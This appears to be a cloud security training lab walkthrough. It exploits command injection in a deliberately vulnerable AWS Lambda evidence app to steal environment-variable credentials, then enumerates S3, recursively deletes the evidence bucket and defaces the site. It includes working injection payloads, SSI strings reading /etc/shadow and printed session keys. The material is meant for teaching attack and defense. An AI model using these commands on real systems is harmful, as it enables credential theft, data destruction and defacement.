# Exercise 4: Exploiting Evidence-App and Pivoting to Cloud Account

<!-- markdownlint-disable MD033-->

<!--Overriding style-->
<style>
  :root {
    --sans-primary-color: #ff0000;
}
</style>

**Estimated Time to Complete:** 15 minutes

## Objectives

* Continue to use command injection to acquire **cloud credentials** used by AWS Lambda function
* Discover what resources these newly-acquired credentials have access to
* Destroy all evidence and deface evidence-app web page
* Unset credential-related environment variables

## Challenges

### Challenge 1: Steal Cloud Credentials From Lambda

When attempting to steal credentials from a system running in cloud, attackers may be drawn to hard-coded credentials like the `aws/credentials` file or interacting with a virtual machine's Instance Metadata Service (IMDS). This, however, is not quite how Lambda operates. When IAM roles are provisioned to Lambda function to allow them to interace with other cloud resources, you can find the credentials as environment variables:

* `AWS_ACCESS_KEY_ID`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_SESSION_TOKEN`

Use your knowledge of how you can conduct command injection against this vulnerable application to acquire these three variable values which *should* give you some level of access into the greater cloud account. Once you have these values, set the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` values in your **CloudShell** session to become the Lambda role user.

??? cmd "Solution"

    1. If you recall the output of the `fuzz_evidence_app.py` script, there was a sample `curl` command to perform command injection.

        !!! summary "Sample Output"

            ```bash
            curl -X POST https://d3d7nz3kb2bgwk.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
            ```

    2. You *could* run the script again, but here is the output (using `$TARGET` in place of the actual CloudFront URL):

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
        ```

    3. If you want to list a user's environment variables, it's quite easy in Linux using the `env` command. So try to replace `id` with `env`:

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env;","file_data":"dGVzdAo="}'
        ```

        !!! summary "Expected Results"

            ```bash
            {"message":"Internal Server Error"}
            ```
    
    4. Hmm... that doesn't seem to work. But why? After hours of troubleshooting, we found that there is a limitation in the amount of bytes you can store in an AWS DynamoDB table (which is where the MD5 and SHA1 results are stored). Are we defeated? No! We just need to massage the command a bit to get the results we're after.

    5. Try this command to limit the amount of characters returned by only matching lines that contain the variable names we're after:

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'
        ```

        !!! summary "Expected Result"

            ```bash
            Success
            ```

    6. Now we're talking! But where are the results? If you remember, to acquire the file name, MD5, and SHA1 sum data, you send a `GET` to `/api/`.

        ```bash
        curl $TARGET/api/
        ```

        !!! summary "Expected Results"

            ```{'Items': [{'SHA1Sum': {'S': '3395856ce81f2b7382dee72602f798b642f14140'}, 'FileName': {'S': 'EICAR.txt'}, 'MD5Sum': {'S': '44d88612fea8a8f36de82e1278abb02f'}}, {'SHA1Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}, 'FileName': {'S': ';env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"'}, 'MD5Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}}, {'SHA1Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}, 'FileName': {'S': ';id;'}, 'MD5Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}}], 'Count': 3, 'ScannedCount': 3, 'ResponseMetadata': {'RequestId': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'HTTPStatusCode': 200, 'HTTPHeaders': {'server': 'Server', 'date': 'Sat, 09 Jul 2022 14:26:43 GMT', 'content-type': 'application/x-amz-json-1.0', 'content-length': '2394', 'connection': 'keep-alive', 'x-amzn-requestid': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'x-amz-crc32': '793005041'}, 'RetryAttempts': 0}}```

    7. It looks like we have credentials! You could use individual `export <VAR_NAME> <VAR_VALUE>` commands to set these credentials for use in your CloudShell session, but here is some Bash Kung Fu to do this for you:

        ```bash
        export AWS_ACCESS_KEY_ID=$(curl -s $TARGET/api/ | egrep -o "AWS_ACCESS_KEY_ID=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2)
        export AWS_SECRET_ACCESS_KEY=$(curl -s $TARGET/api/ | egrep -o "AWS_SECRET_ACCESS_KEY=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
        export AWS_SESSION_TOKEN=$(curl -s $TARGET/api/ | egrep -o "AWS_SESSION_TOKEN=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
        ```

### Challenge 2: Perform Discovery in Cloud Account

Now that you are armed with credentials, see which account you compromised, get a lay of the land, and see which resource types you now have access to.

??? cmd "Solution"

    1. The first task is to determine who these credentials belong to. You can determine this quite easily by using the AWS CLI tools available in your **CloudShell** session. The first command you will use is:

        ```bash
        aws sts get-caller-identity
        ```

        !!! summary "Solution"

            ```bash
            {
                "UserId": "AROATAI5Z633T7ULOW742:evidence",
                "Account": "012345678910",
                "Arn": "arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence"
            }
            ```

    2. You have now verified that you stole credentials from a Lambda function. You also see the name of the role (`EvidenceLambdaRole`). Now, attempt to see which permissions this Lambda role may have by executing the following command:

        ```bash
        aws iam list-attached-role-policies --role-name EvidenceLambdaRole
        ```

        !!! summary "Expected Results"

            ```An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: iam:ListAttachedRolePolicies on resource: role EvidenceLambdaRole because no identity-based policy allows the iam:ListAttachedRolePolicies action```

    3. This comes up empty as the role does not have rights to view its own permissions. The next logical step would be to try some of the more common AWS CLI commands that an attacker may try to gain access to critical or sensitive cloud resources.

        ```bash
        aws ec2 describe-instances
        ```

        !!! summary "Solution"

            ```An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.```

        ```bash
        aws rds describe-db-instances
        ```

        !!! summary "Solution"

            ```An error occurred (AccessDenied) when calling the DescribeDBInstances operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: rds:DescribeDBInstances on resource: arn:aws:rds:us-east-1:012345678910:db:* because no identity-based policy allows the rds:DescribeDBInstances action```

        ```bash
        aws s3 ls
        ```

        !!! summary "Solution"

            ```bash
            2022-07-10 14:34:30 aws-logs-ev6hyhqiwb0duypb
            2022-07-10 14:34:30 cloudtrail-ev6hyhqiwb0duypb
            2022-07-10 14:34:30 evidence-ev6hyhqiwb0duypb
            2022-07-10 14:34:30 webcode-ev6hyhqiwb0duypb
            ```

    4. After some trial-and-error, you can that you can utilize the `ListBuckets` API call with these stolen credentials. Set the `WEBCODE_BUCKET` and `EVIDENCE_BUCKET` environment variables to the names of the buckets beginning with `evidence-` and `webcode-`, respectively, as you will interact with these buckets a few times in the next challenge. Here is some Bash Kung Fu to do just that:

        ```bash
        EVIDENCE_BUCKET=$(aws s3 ls | egrep -o evidence-.*)
        WEBCODE_BUCKET=$(aws s3 ls | egrep -o webcode-.*)
        echo "The evidence bucket is: $EVIDENCE_BUCKET"
        echo "The webcode bucket is:  $WEBCODE_BUCKET"
        ```

        !!! summary "Expected Results"

            ```bash
            The evidence bucket is: evidence-ev6hyhqiwb0duypb
            The webcode bucket is:  webcode-ev6hyhqiwb0duypb
            ```

### Challenge 3: Destruction and Defacement

One of the bucket names that you uncovered in the last challenge begins with the text `webcode-`. This is the static web content for the **evidence-app**. Normally, penetration tests may go the route of adding or modifying a single file to "prove the point" that unapproved and privileged access was achieved.

Since this is a development environment, you can create more "shock and awe". Delete all of the evidence from the from S3 and deface the **evidence-app** web page.

??? cmd "Solution"

    1. Since you have `ListBuckets` access, see if you can list the contents of the `evidence-` bucket to see the uploaded evidence files.

        ```bash
        aws s3 ls s3://$EVIDENCE_BUCKET
        ```

        !!! summary "Expected Results"

            ```bash
                                       PRE &lt;!--#exec%20cmd=&quot;/
                                       PRE /
            2022-07-10 15:38:14          5 ;env;
            2022-07-10 15:38:21          5 ;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
            2022-07-10 15:37:39          5 ;id;
            2022-07-10 15:37:12      94181 archer.png
            ```

    2. You can see a number of your exploit attempts! Let's clear the content of the bucket to do two things: cover our tracks a bit and cause the destruction of these legitimate files.

        ```bash
        aws s3 rm s3://$EVIDENCE_BUCKET --recursive
        ```

        !!! summary "Expected Results"

            ```bash
            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
            delete: s3://evidence-pbk4g30a3h7nghii/;env;
            delete: s3://evidence-pbk4g30a3h7nghii//index.html|id|
            delete: s3://evidence-pbk4g30a3h7nghii/;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
            delete: s3://evidence-pbk4g30a3h7nghii/;id;
            delete: s3://evidence-pbk4g30a3h7nghii/archer.png
            ```

    3. Verify that the bucket is now empty. If it is empty, the following command should not have any output:

        ```bash
        aws s3 ls s3://$EVIDENCE_BUCKET
        ```

    4. And now on to the defacement of the web page. Take a look at what is in the bucket beginning with `webcode-`.

        ```bash
        aws s3 ls s3://$WEBCODE_BUCKET
        ```

        !!! summary "Expected Results"

            ```bash
            2022-07-10 15:22:18     497556 Cloud_Ace_Final.png
            2022-07-10 15:22:18         15 error.html
            2022-07-10 15:22:18        318 favicon.ico
            2022-07-10 15:25:51        935 index.html
            2022-07-10 15:25:51       1547 script.js
            2022-07-10 15:22:18        607 styles.css
            ```

    5. It appears that the static code for this application is set up in a similar structure to most web services:

        * An `index.html` page for the homepage
        * An `error.html` page for client request errors
        * The SANS Cloud Ace image file (`Cloud_Ace_Final.png`)
        * A `favicon.ico` file used for the web site icon
        * A `styles.css` file for styling of the page
        * A `script.js` file that we saw earlier for client-side processing

    6. Generate a new `index.html` page to replace the legitimate one.

        ```bash
        cat << EOF > /tmp/index.html
        <html>
        <body>
        <h1>Your evidence is gone!<br/>-Moriarty</h1>
        </body>
        </html>
        EOF
        ```

    7. Upload this file to the root of the bucket beginning with `webcode-`.

        ```bash
        aws s3 cp /tmp/index.html s3://$WEBCODE_BUCKET/index.html
        ```

    8. Refresh the **evidence-app** homepage in your web browser to see the new content.

        !!! note

            If you closed this tab, you can see the evidence-app URL by running the following command in **CloudShell**:

            ```bash
            echo $TARGET
            ```

        ![](../img/exercise4/1.png ""){: class="w300" }

### Challenge 4: Unset Environment Variables

So that the next series of challenges are successful (you will be acting as a defender), unset the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` environment varibles so that your current IAM user's credentials are used.

??? cmd "Solution"

    1. In your **CloudShell** session, run the following commands to unset your AWS credential-related environment variables:

        ```bash
        unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
        ```

    2. Verify that you can still access AWS using the CLI tools and are the correct user.

        ```bash
        aws sts get-caller-identity
        ```

        !!! summary "Expected Results"

            ```bash
            {
                "UserId": "012345678910",
                "Account": "012345678910",
                "Arn": "arn:aws:iam::012345678910:root"
            }
            ```
